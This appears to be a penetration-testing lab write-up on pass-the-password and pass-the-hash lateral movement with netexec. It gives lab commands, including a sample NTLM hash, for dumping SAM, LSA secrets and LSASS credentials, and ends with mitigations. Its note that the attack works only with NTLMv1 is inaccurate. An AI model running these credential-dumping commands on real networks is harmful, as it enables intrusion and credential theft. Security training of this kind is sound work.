## Overview

"Pass-the-Password" and "Pass-the-Hash" are lateral movement techniques used to exploit valid credentials and hashes to gain unauthorized access to machines within a network. These attacks bypass traditional authentication by directly passing the password or hash to authenticate with systems.

### Requirements for Pass Attacks

- **Valid credentials** (username and password) or **hashes** (dumped from tools like `secretsdump.py`).
- Administrative privileges (local admin) on the target systems.
- Tools: We'll be using `netexec` (`nxc` for shorthand in this lab) for these operations.

`netexec` is a tool used for executing commands over SMB and is designed for lateral movement across a Windows network, replacing the older `crackmapexec`. It allows you to interact with remote systems by passing passwords or hashes for local or domain accounts.

---

## Netexec Functionality

### Pass-the-Password Attack
Use a known password to authenticate across a network and check for local admin rights:
`netexec smb <ip/CIDR> -u <user> -d <domain> -p <pass>`

- `<ip/CIDR>`: Target IP address or range.
- `<user>`: Username to authenticate.
- `<domain>`: Domain name (use `.` for local accounts).
- `<pass>`: Password for the account.
### Pass-the-Hash Attack
Authenticate using an NTLM hash instead of a plaintext password:
`netexec smb <ip/CIDR> -u <user> -H <hash> --local-auth`

- `-H <hash>`: NTLM hash of the password.
- `--local-auth`: Use local account authentication.
### Dumping SAM

Retrieve the Security Account Manager (SAM) database containing local user credentials:
`netexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --sam`
### Enumerating Shares

List shared resources on remote systems:
`netexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --shares`
### Dumping LSA Secrets

Extract Local Security Authority (LSA) secrets, which might hold sensitive information such as service account credentials:
`netexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --lsa`
### Using Modules

Run specific modules like `nanodump` to dump credentials from LSASS or perform other operations:
`netexec smb <ip/CIDR> -u <user> -H <hash> --local-auth -M nanodump`

---

## Lab Environment and Example Walkthrough

Below is the walkthrough of running pass-the-password and pass-the-hash attacks in the lab environment.

---

### Pass the Password

#### Step 1: Using NXC

`nxc smb <ip/CIDR> -u <user> -d <domain> -p <pass>` 

For example:

`nxc smb 192.168.163.0/24 -u j.smith -d quigley.local -p Password1`

- When conducting password pass attacks, it’s important to specify ranges or subnets.

![Pasted image 20250220214045](https://github.com/user-attachments/assets/e814a720-569f-47bb-8b40-c1ddd4aba228)


- In this example, the password was passed to both workstations, where **j.smith** is a local administrator.
- On the Domain Controller (DC), while we had successful authentication, **j.smith** wasn’t a local admin, so we didn’t gain control of the DC.

---

### Pass the Hash

#### **Works Only with NTLMv1**

#### Step 1: Using NXC

`nxc smb <ip/CIDR> -u <user> -H <hash> --local-auth` 

For example:

`nxc smb 192.168.163.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth`

![Pasted image 20250220214600](https://github.com/user-attachments/assets/9e015e73-4736-425c-aa78-47f957b91dfe)


- It's common to reuse the same local administrator password across devices in an environment. Once one is compromised, it can be passed around to other machines.
- In this case, the DC's local admin password was different from the one used on the workstations, so we were unable to access the DC.

---

### Dumping SAM

`nxc smb 192.168.163.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --sam`

![Pasted image 20250220214813](https://github.com/user-attachments/assets/0d2ea076-1598-4693-aa4d-f0c898c32a11)

- This command dumps the hashes and stores them in our database.

---

### Share Enumeration

`nxc smb 192.168.163.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --shares`

![Pasted image 20250220214949](https://github.com/user-attachments/assets/9e87858f-0f21-463f-94b5-675f5fb449eb)


---

### LSA Dump

`nxc smb 192.168.163.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --lsa`

- Secrets dumped from LSA might not always be valid. Passwords could have changed since they were last stored and may be outdated.

---

### Lsassy/Nanodump

`sudo nxc smb 192.168.163.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth -M nanodump`

![Pasted image 20250220222133](https://github.com/user-attachments/assets/73dde39c-5d95-4735-b69e-875b1765b816)

---

## Pass Attack Mitigation

Limit account re-use:
	• Avoid re-using local admin password
	• Disable Guest and Administrator accounts
	• Limit who is a local administrator (least privilege) 
• Utilize strong passwords:
	• The longer the better (>14 characters)
	• Avoid using common words
• Privilege Access Management (PAM):
	• Check out/in sensitive accounts when needed
	• Automatically rotate passwords on check out and check in
	• Limits pass attacks as hash/password is strong and constantly rotated
